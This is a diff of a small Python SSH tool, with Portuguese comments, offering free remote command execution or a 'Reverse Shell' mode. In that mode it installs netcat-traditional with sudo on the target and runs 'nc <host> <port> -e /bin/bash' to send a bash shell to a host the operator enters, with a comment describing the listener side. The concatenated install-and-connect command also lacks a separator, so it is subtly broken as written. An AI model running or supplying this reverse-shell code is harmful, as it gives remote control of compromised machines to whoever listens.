@@ -12,7 +12,7 @@ c.connect(host, username= user, password= passwd) #Passa os parâmetros para a c
 
 
 
-def exe_terminal():
+def exe_terminal(host=host):
     urhost = input("Enter your host: ")
     print("Connected to the SSH server. You can now execute commands...\n")
     choose = input ("Choose one: [1] - Free Texting [2] - Reverse Shell: ")
@@ -21,12 +21,13 @@ def exe_terminal():
         urhost = input("Enter your host: ")
         cmd = ("sudo apt update && sudo apt install netcat-traditional -y" + f"nc {urhost} {port} -e /bin/bash") #Comando para instalar o netcat-traditional e criar a conexão reversa
         stdin, stdout, stderr = c.exec_command(cmd)
-        print(stdout.read().decode())
-        err = stderr.read().decode()
-        if err:
-            print(f"Error {err}")
-        print("Starting reverse shell...")           #No seu terminal nc -lvp e a porta que você escolheu para receber a conexão reversa
         while True:
+            print(stdout.read().decode())
+            err = stderr.read().decode()
+            if err:
+                print(f"Error {err}")
+            print("Starting reverse shell...")           #No seu terminal nc -lvp e a porta que você escolheu para receber a conexão reversa    #arrumar aqui
+            stdin, stdout, stderr = c.exec_command(input(f"Host {host}$~ Your command on host: "))
             output = stdout.readline()
             if output:
                 print(output.strip())
@@ -40,6 +41,22 @@ def exe_terminal():
                 break
         c.close()
     elif choose == "1":
-        print("You can now execute commands on the remote server. Type 'exit' to disconnect.\n")
+        print("You can now execute commands on the remote server. Type 'exit' to disconnect.\n")  
+        while True:
+            command = input(f"{host}$~ Your command on host: ")
+            if command.lower() == 'exit':
+                print("Disconnecting from the SSH server...")
+                c.close()
+                break
+            stdin, stdout, stderr = c.exec_command(command)
+            output = stdout.read().decode()
+            error = stderr.read().decode()
+            if output:
+                print(output.strip())
+            if error:
+                print(f"Error: {error.strip()}")
+        stdin, stdout, stderr = c.exec_command(input(f"You're listening on {host}: "))
 
-exe_terminal()
+
+if __name__ == "__main__":
+    exe_terminal()
